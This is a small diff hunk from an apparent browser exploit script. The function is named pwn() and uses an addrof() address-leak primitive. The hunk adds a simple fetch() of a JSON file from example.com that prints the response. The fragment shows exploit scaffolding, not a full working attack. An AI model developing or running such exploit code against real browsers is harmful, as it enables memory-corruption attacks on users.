@@ -520,6 +520,14 @@ function pwn()
        var wrapper = document.createElement('div');
        var wrapperaddr = addrof(wrapper);
        print("wrapper addr:" + wrapperaddr);
+	    
+fetch('http://example.com/movies.json')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(myJson) {
+    print(JSON.stringify(myJson));
+  });
        
 
     }
